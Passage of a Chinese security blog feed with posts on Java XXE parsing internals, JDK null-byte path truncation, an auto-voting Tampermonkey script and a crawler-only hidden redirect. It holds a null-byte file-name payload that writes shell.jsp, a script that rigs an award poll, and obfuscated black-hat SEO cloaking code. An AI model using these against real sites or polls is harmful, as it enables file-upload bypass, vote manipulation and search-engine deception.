alt></p><p>这时next()方法会对XML中的元素进行扫描。当扫描到文本中的<code>&amp;</code>字符时（识别一般实体），将状态置为<code>SCANNER_STATE_REFERENCE</code>。</p><p><img src="/articles/2019/study-the-deep-principle-of-xxe-vulnerability-in-java/SCANNER_STATE_REFERENCE.png" alt="将扫描状态改为SCANNER_STATE_REFERENCE"></p><p>在引用扫描状态下，解析器会调用scanEntityReference() 扫描实体引用。</p><p><img src="/articles/2019/study-the-deep-principle-of-xxe-vulnerability-in-java/scanEntityReference.png" alt></p><p>其中将调用XMLEntityManager的startEntity()将应用程序定义的XML实体流插入解析流。</p><p><img src="/articles/2019/study-the-deep-principle-of-xxe-vulnerability-in-java/func_startEntity.png" alt></p><p>最后会调用setupCurrentEntity()创建连接并发起请求，以获取外部实体的内容，这时XXE漏洞将会触发！</p><p><img src="/articles/2019/study-the-deep-principle-of-xxe-vulnerability-in-java/setupCurrentEntity.png" alt="setupCurrentEntity触发XXE漏洞"></p><p>最终调用链如下图所示</p><p><img src="/articles/2019/study-the-deep-principle-of-xxe-vulnerability-in-java/DOMXXETest.png" alt></p><h2 id="0x03-参考文章"><a href="#0x03-参考文章" class="headerlink" title="0x03 参考文章"></a>0x03 参考文章</h2><ul><li><a href="https://github.com/gyyyy/footprint/blob/master/articles/2018/xxe-injection-overview.md" target="_blank" rel="noopener">XXE注入漏洞概述</a></li><li><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet" target="_blank" rel="noopener">https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从代码层面理解java的00截断漏洞深入篇</title>
      <link href="/articles/2019/java-00-truncation-detail/"/>
      <url>/articles/2019/java-00-truncation-detail/</url>
      
        <content type="html"><![CDATA[<p>4个月前写了一篇文章叫<a href="http://gv7.me/articles/2018/java-00-truncation/">《从代码层面理解java的00截断漏洞》</a>，由于当时出差新疆没时间深入，便在文末立了个有空继续深入的flag。今天我们通过跟踪jdk代码， <strong>彻底搞清楚java中00截断的原理，以及它之后版本是如何修复的？</strong></p><h2 id="一、漏洞测试代码改进"><a href="#一、漏洞测试代码改进" class="headerlink" title="一、漏洞测试代码改进"></a>一、漏洞测试代码改进</h2><p>看了一些java web系统文件上传代码，基本都是使用<code>FileOutputStream</code>来实现对上传内容的保存。于是将上篇文章的测试代码修改如下，简单模拟java的文件上传。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">T2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String filepath = <span class="string">"c://shell.jsp"</span> + (<span class="keyword">char</span>)<span class="number">0</span> + <span class="string">".txt"</span>;</span><br><span class="line">        String content = <span class="string">"Test by c0ny1"</span>;</span><br><span class="line">        System.out.println(filepath);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(filepath);</span><br><span class="line">            fos.write(content.getBytes());</span><br><span class="line">            fos.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过在漏洞版本和非漏洞版本运行以上代码，可知如果00截断成功，则会在系统的c盘根目录新建一个内容为<code>Test by c0ny1</code>的<code>shell.jsp</code>，如果没有截断成功，则抛出<code>Invalid file path</code>异常。</p><h2 id="二、漏洞是如何产生的"><a href="#二、漏洞是如何产生的" class="headerlink" title="二、漏洞是如何产生的?"></a>二、漏洞是如何产生的?</h2><p>我选择使用<code>JDK1.7.0</code>（JDK1.7第一个版本），来跟踪漏洞测试代码从运行到触发。</p><p><img src="/articles/2019/java-00-truncation-detail/vul-01.png" alt="第一个构造函数"></p><p>将传进来的name参数作为路径，新建了File对象，再次传入到<code>FileOutputStream</code>对象新的构造函数。根据传入的两个参数的类型，我们可以确定会进入到以下这个构造函数。</p><p><img src="/articles/2019/java-00-truncation-detail/vul-02.png" alt="第二个构造函数"></p><p>FileOutputStream对象的构造方法又调用了open函数，打开了name参数传进来的文件路径，我们继续跟进open函数。</p><p><img src="/articles/2019/java-00-truncation-detail/vul-03.png" alt="open方法的声明"></p><p>发现open函数是一个native method。它的实现体是由非java语言（c语言）实现的。只能去OpenJDK官网下载jdk源码来查看它的实现。无奈没有找到jdk7u1的源码，只找到了<a href="https://download.java.net/openjdk/jdk7u75/ri/openjdk-7u75-src-b13-18_dec_2014.zip" target="_blank" rel="noopener">jdk7u75</a>的源码。其实在小版本上源码应该区别不大。</p><p>在<code>\openjdk\jdk\src\windows\native\java\io\FileOutputStream_md.c</code>中找到了<code>FileOutputStream</code>类的<code>open</code>方法的JNI实现。open方法又调用了<code>fileOpen</code>方法，继续跟进fileOpen方法。</p><p><img src="/articles/2019/java-00-truncation-detail/vul-04.png" alt="open方法的定义"></p><p>在<code>io_util_md.c</code>中找到了<code>fileOpen</code>方法的定义。</p><p><img src="/articles/2019/java-00-truncation-detail/vul-05.png" alt="fileOpen方法的定义"></p><p>fileOpen方法调用了<code>winFileHandleOpen</code>函数，继续跟进。由于winFileHandleOpen函数代码比较多，这里精简出了关键代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">jlong <span class="title">winFileHandleOpen</span><span class="params">(JNIEnv *env, jstring path, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">......</span><br><span class="line">    <span class="keyword">if</span> (onNT) &#123; <span class="comment">//如果在Windows NT/Windows 2000操作系统下</span></span><br><span class="line">        WCHAR *pathbuf = pathToNTPath(env, path, JNI_TRUE);</span><br><span class="line">        <span class="keyword">if</span> (pathbuf == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="comment">/* Exception already pending */</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        h = CreateFileW(</span><br><span class="line">            pathbuf,            <span class="comment">/* Wide char path name */</span></span><br><span class="line">            access,             <span class="comment">/* Read and/or write permission */</span></span><br><span class="line">            sharing,            <span class="comment">/* File sharing flags */</span></span><br><span class="line">            <span class="literal">NULL</span>,               <span class="comment">/* Security attributes */</span></span><br><span class="line">            disposition,        <span class="comment">/* creation disposition */</span></span><br><span class="line">            flagsAndAttributes, <span class="comment">/* flags and attributes */</span></span><br><span class="line">            <span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">free</span>(pathbuf);<span class="comment">//创建文件</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        WITH_PLATFORM_STRING(env, path, _ps) &#123;</span><br><span class="line">            h = CreateFile(_ps, access, sharing, <span class="literal">NULL</span>, disposition,flagsAndAttributes, <span class="literal">NULL</span>);<span class="comment">//创建文件</span></span><br><span class="line">        &#125;</span><br><span class="line">        END_PLATFORM_STRING(env, _ps);</span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line">    <span class="keyword">return</span> (jlong)h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过阅读以上代码，可知如果在Windows NT/Windows 2000平台下会调用<code>pathToNTPath</code>函数将原始文件路径转化为Windows NT系统合法路径。然而通过阅读该方法源码，发现它并没有对\00字符串进行过滤。如果在其他Window操作系统版本下，则直接使用原始文件路径。</p><p>按照<code>winFileHandleOpen</code>方法的逻辑，无论如何最终都是调用了<code>CreateFileW</code>这个Windows API函数来创建文件。由于这个过程中均未对<code>\00</code>字符串进行过滤，如果传入的文件路径带有\00字符，则<code>CreateFileW</code>函数在创建文件时，路径会被截断。这没什么好说的。</p><p>这里我们没法继续跟进CreateFileW函数，毕竟Windows不开源。为了文章的严谨性，这里我用C语言写一个demo，来证明该函数可以截断。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE fileHandle = CreateFileW(<span class="string">L"C:\\shell.jsp\0test.txt"</span>, GENERIC_WRITE, FILE_SHARE_WRITE, <span class="number">0</span>, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">char</span> *data = <span class="string">"Test by c0ny1"</span>;</span><br><span class="line">DWORD a = <span class="built_in">strlen</span>(data);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> b;</span><br><span class="line">WriteFile(fileHandle, data, a, &amp;b, <span class="literal">NULL</span>);</span><br><span class="line">CloseHandle(fileHandle);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码运行演示如下：</p><p><img src="/articles/2019/java-00-truncation-detail/show.gif" alt="CreateFileW函数00截断演示"></p><h2 id="三、漏洞是如何修复的？"><a href="#三、漏洞是如何修复的？" class="headerlink" title="三、漏洞是如何修复的？"></a>三、漏洞是如何修复的？</h2><p>这里选择使用<code>jdk1.7.0_80</code>（JDK1.7最新版本），来观察漏洞如果被修复的。</p><p>我们继续按照原来漏洞触发的调用链重新跟踪一遍，跟踪到第二构造函数时，发现多了一个针对文件路径的检查，若检查结果为非法，则抛出异常<code>Invalid file path</code>.</p><p><img src="/articles/2019/java-00-truncation-detail/fix-01.png" alt="构造函数中检查文件路径"></p><p>继续跟进，来到<code>java.io.File</code>类的<code>isInvalid</code>方法,发现该检查函数判断了路径中是否包含00字符串。（注意：java默认编码为Unicode，00字符串的Unicode编码为\u0000）。</p><p><img src="/articles/2019/java-00-truncation-detail/fix-02.png" alt="文件路径检查函数"></p><h2 id="四、漏洞影响的版本范围"><a href="#四、漏洞影响的版本范围" class="headerlink" title="四、漏洞影响的版本范围"></a>四、漏洞影响的版本范围</h2><p>我们知道jdk1.7版本是部分版本存在漏洞的。但这里我们需要确定是哪个版本修复了这个漏洞。翻阅了JDK1.7多个版本代码，发现在JDK1.7.0_40（7u40）开始加上了对文件名是否存在\00字符的检查。也就是说 <strong>JDK1.7.0_40之前java是存在00截断的，而之后的版本就不存在了！</strong></p><p>后面在官网的JDK 7u40的更新日志中也找到了关于00截断问题Bug ID，分别为<code>JDK-8003992</code>和<code>JDK-8011539</code>，具体链接放在了文末的参考文章里了。其实这两个是同一个Bug，官网也说明了它们重复了。</p><p><img src="/articles/2019/java-00-truncation-detail/update_note.png" alt="oracle官方更新日志"></p><h2 id="五、参考文章"><a href="#五、参考文章" class="headerlink" title="五、参考文章"></a>五、参考文章</h2><ul><li><a href="https://blog.csdn.net/I_S_T_O/article/details/1843871" target="_blank" rel="noopener">JAVA /00文件路径截断漏洞与分析for windows并对.NET比较</a></li><li><a href="https://bugs.java.com/bugdatabase/view_bug.do?bug_id=8003992" target="_blank" rel="noopener">JDK-8003992 : File and other classes in java.io do not handle embedded nulls properly</a></li><li><a href="https://bugs.java.com/bugdatabase/view_bug.do?bug_id=8011539" target="_blank" rel="noopener">JDK-8011539 : File APIs Should Not Allow Null Bytes</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 00截断 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小玩具01:编写WSIS自动投票油猴脚本</title>
      <link href="/articles/2019/tampermonkey-script-autoclicker/"/>
      <url>/articles/2019/tampermonkey-script-autoclicker/</url>
      
        <content type="html"><![CDATA[<p>这是1月9号的事了，kang哥在群里发了一个消息，说是需要大家帮忙WSIS奖投票。让每位同事都投一遍。我看了下投票步骤说明文档，其实挺麻烦的。最主要的是足足有18项，需要一个个的点击才能完成。旁边的JackyTsuuuy大佬慢悠悠的蠕动着他性感的小胡须，说道可以尝试使用js自动点击完成这18项选择，还提供了最朴素的几行代码。在他几次怂恿下决定实现这一想法。</p><a id="more"></a><h2 id="一、需求"><a href="#一、需求" class="headerlink" title="一、需求"></a>一、需求</h2><p>当时发的投票步骤说明文档具体需求如下：</p><p>投票页面有18个Category，每完成一个Category的投票就会自动进行下一个Category页面，需要完成所有18个Category的投票。注意：重点在<code>Category5-AL C5</code>选择 <strong>Artificial Intelligence (AI) based spam messages and calls prevention solution</strong> ，其他Category可以任意选。</p><h2 id="二、思路"><a href="#二、思路" class="headerlink" title="二、思路"></a>二、思路</h2><p>判断页面是否有内容为“Artificial Intelligence (AI) based spam messages and calls prevention solution”选项的按钮，如果有就点击，没有就随机选择一个选项。然后进入下一页，等待页面加载完成继续重复上面的操作。其实思路很简单，代码实现也不难，但是细节问题却耐人寻味，想给大家分享下。</p><h2 id="三、实现"><a href="#三、实现" class="headerlink" title="三、实现"></a>三、实现</h2><p>通过前端分析，发现内容为“Artificial Intelligence (AI) based spam messages and calls prevention solution”选项对应着是一个标签名为<code>button</code>，属性<code>value</code>的值为<code>15434938390848023</code>的按钮。</p><p><img src="/articles/2019/tampermonkey-script-autoclicker/positioning-elements.png" alt="分析要点击的页面元素"></p><p>注意：定位选择的属性名和属性值在当前页面是唯一的，这样才能保证点击正确。</p><p>实现定位目标选项的代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*定位要点击的页面元素*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getTargetByTAV</span>(<span class="params">t_tag,t_attr,t_value</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> target = <span class="built_in">document</span>.getElementsByTagName(t_tag);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i &lt;target.length;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(target[i].getAttribute(t_attr) == t_value)&#123;</span><br><span class="line"><span class="keyword">return</span> target[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> target = getTargetByTAV(<span class="string">"button"</span>,<span class="string">"value"</span>,<span class="string">"15434938390848023"</span>);</span><br></pre></td></tr></table></figure><p>当页面没有内容为<code>Artificial...solution</code>对应的选项时，就随机选择一项点击。分析页面发现每个选项对应的按钮元素都有<code>name=&quot;voteProjectId&quot;</code>,我们以此来定位它们。实现代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// code refence: https://www.cnblogs.com/phpyangbo/p/6129868.html</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">RandomNum</span>(<span class="params">Min, Max</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> Range = Max - Min;</span><br><span class="line">    <span class="keyword">var</span> Rand = <span class="built_in">Math</span>.random();</span><br><span class="line">    <span class="keyword">var</span> num = Min + <span class="built_in">Math</span>.floor(Rand * Range);  <span class="comment">//舍去</span></span><br><span class="line">    <span class="keyword">return</span> num;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getTargetByRandom</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> target = <span class="built_in">document</span>.getElementsByName(<span class="string">"voteProjectId"</span>);</span><br><span class="line"><span class="keyword">var</span> n = RandomNum(<span class="number">0</span>,target.length);</span><br><span class="line"><span class="keyword">return</span> target[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后呢，为了保证点击成功，我们设置每间隔<code>100ms</code>就重复点击一次。实现代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (button) &#123;</span><br><span class="line">        button.click();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,<span class="number">100</span>);</span><br></pre></td></tr></table></figure><p>将以上代码放到浏览器开发者工具的console中执行是可以的，但是会存在一个问题。那就是页面刷新后，我们编写的代码将不会作用于新的页面。为了解决这个问题，当然可以编写一个浏览器插件来解决，但是油猴已经做好了这个工作。我们只需要站在巨人的肩膀上，完成我们的想法即可。</p><p>按照油猴的脚本编写规则，最终源码为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ==UserScript==</span></span><br><span class="line"><span class="comment">// @name         wsis-auto-vote</span></span><br><span class="line"><span class="comment">// @namespace    http://gv7.me</span></span><br><span class="line"><span class="comment">// @version      0.1</span></span><br><span class="line"><span class="comment">// @description  wsis 自动投票，自动投"Artificial Intelligence (AI) based spam messages and calls prevention solution"选项。</span></span><br><span class="line"><span class="comment">// @author       c0ny1</span></span><br><span class="line"><span class="comment">// @match        https://www.itu.int/*</span></span><br><span class="line"><span class="comment">// @grant        none</span></span><br><span class="line"><span class="comment">// ==/UserScript==</span></span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="meta">    'use strict'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*定位要点击的页面元素*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getTargetByTAV</span>(<span class="params">t_tag,t_attr,t_value</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> target = <span class="built_in">document</span>.getElementsByTagName(t_tag);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i &lt;target.length;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(target[i].getAttribute(t_attr) == t_value)&#123;</span><br><span class="line"><span class="keyword">return</span> target[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// code refence: https://www.cnblogs.com/phpyangbo/p/6129868.html</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">RandomNum</span>(<span class="params">Min, Max</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> Range = Max - Min;</span><br><span class="line">    <span class="keyword">var</span> Rand = <span class="built_in">Math</span>.random();</span><br><span class="line">    <span class="keyword">var</span> num = Min + <span class="built_in">Math</span>.floor(Rand * Range);  <span class="comment">//舍去</span></span><br><span class="line">    <span class="keyword">return</span> num;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*随机获取一个要点击的页面元素*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getTargetByRandom</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> target = <span class="built_in">document</span>.getElementsByName(<span class="string">"voteProjectId"</span>);</span><br><span class="line"><span class="keyword">var</span> n = RandomNum(<span class="number">0</span>,target.length);</span><br><span class="line"><span class="keyword">return</span> target[n];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> btn;</span><br><span class="line">btn = getTargetByTAV(<span class="string">"button"</span>,<span class="string">"value"</span>,<span class="string">"15434938390848023"</span>);</span><br><span class="line"><span class="keyword">if</span>(btn === <span class="literal">undefined</span>)&#123;</span><br><span class="line">    btn = getTargetByRandom();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (btn !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"[+] click obj: "</span> + btn.innerHTML);</span><br><span class="line">        btn.click();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'[-] click obj is undefined!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,<span class="number">3000</span>);</span><br><span class="line"></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p><img src="/articles/2019/tampermonkey-script-autoclicker/show.gif" alt="最终效果"></p><h2 id="五、延伸"><a href="#五、延伸" class="headerlink" title="五、延伸"></a>五、延伸</h2><p>刚才是一个具体场景下的代码实现。但是我思考了下，其实我们生活中还有很多场景，可以通过快速重复点击页面元素来解决。比如春节的刷票，大学的抢课，双11的抢购等等。也许有人有疑问，使用burp多次重放数据包不就可以了么？其实这样不一定行，因为请求可能需要提交token或者其他需要浏览器执行js获取到的数据。</p><p>于是我改基于以上代码，编写了一个适合更多场景下快速重复点击页面元素的油猴脚本。该脚本已经在油猴的在线脚本库Greasy Fork发布了，想看最新源码或者使用的朋友<a href="https://greasyfork.org/zh-CN/scripts/376507-autoclicker" target="_blank" rel="noopener">请点击这里</a>。</p><p>该脚本提供了通过以下几种方式获取需要点击的页面元素：</p><table><thead><tr><th align="center">序号</th><th align="left">定位方式</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">1</td><td align="left">id</td><td align="left">提供页面要点击元素的id，赋值给id变量即可</td></tr><tr><td align="center">2</td><td align="left">标签名，属性，属性值</td><td align="left">提供页面要点击元素的标签名，属性，属性值分别给tag，attr，value即可</td></tr><tr><td align="center">3</td><td align="left">xpath</td><td align="left">提供页面要点击元素的xpath，赋值给str_xpath变量即可</td></tr><tr><td align="center">4</td><td align="left">selector</td><td align="left">提供页面要点击元素的selector，赋值给str_qs变量即可</td></tr><tr><td align="center">5</td><td align="left">自定义定位函数</td><td align="left">以上方式无法定位到目标元素，可以将isCustom变量赋值为true，同时编写getTargetByCustom函数的函数体，返回定位成功的元素即可</td></tr></tbody></table><p>具体使用方法请移步<a href="https://greasyfork.org/zh-CN/scripts/376507-autoclicker" target="_blank" rel="noopener">Greasy Fork</a>。</p><h2 id="六、最后"><a href="#六、最后" class="headerlink" title="六、最后"></a>六、最后</h2><p>最后给大家留一个思考： <strong>该如何权衡我们脚本点击提交的速度和成功率？</strong></p><ol><li>如果我们的脚本点击按钮过快，可能表单某些必要的值（比如token，需要每次发送ajax请求来更新）还没有被加载。从而导致提交失败。</li><li>如果等待所有资源都加载完成，然后脚本在进行点击操作，这样又太慢展现不了脚本的优势（比如抢购场景下）。</li></ol><p>考虑这些特殊情况，会让我们的脚本更加壮硕，欢迎留言讨论。</p>]]></content>
      
      
      <categories>
          
          <category> 小玩具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 油猴脚本 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个有趣的暗链</title>
      <link href="/articles/2019/an-interesting-dark-chain/"/>
      <url>/articles/2019/an-interesting-dark-chain/</url>
      
        <content type="html"><![CDATA[<p>今天吃完午饭，无意听到同事说起了以前查网站暗链的事。他说有一种暗链其实隐藏得挺深的，正常去访问是不会触发，而当百度等搜索引擎的爬虫去爬取该页面时，就会进行跳转。从而将爬虫引入到黑客指定的站点，来提升指定站点的排名。</p><p>思考了下，感觉比那些直接简单粗暴直接跳转要妙多了。饭后去网上找了下，没有找到相关代码。打算自己写一个（可能真实的案例不是这么写的）。</p><h2 id="一、代码实现"><a href="#一、代码实现" class="headerlink" title="一、代码实现"></a>一、代码实现</h2><p>下面我们尝试从黑帽SEO的角度来思考问题和编写代码。我实现的方式是通过js判断ua，来识别是否是百度爬虫，从而决定是否跳转。代码很简单，具体如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> keyword = <span class="string">"baidu"</span>; <span class="comment">//关键字</span></span><br><span class="line"><span class="keyword">var</span> my_site = <span class="string">"http://gv7.me"</span>; <span class="comment">//要跳转到的网站</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ua = navigator.userAgent;</span><br><span class="line"><span class="keyword">if</span>(ua.toLowerCase().indexOf(keyword) &gt;= <span class="number">0</span>)&#123; <span class="comment">//判断ua是否是百度爬虫</span></span><br><span class="line"><span class="built_in">window</span>.location.href=my_site;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>为了加强隐僻性，我们对以上代码进行混淆和压缩。</p><p><img src="/articles/2019/an-interesting-dark-chain/obfuscating-compressed-js-code.png" alt></p><p>最终测试页面代码为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">title</span>&gt;</span>test for hack seo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>test for hack seo!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span 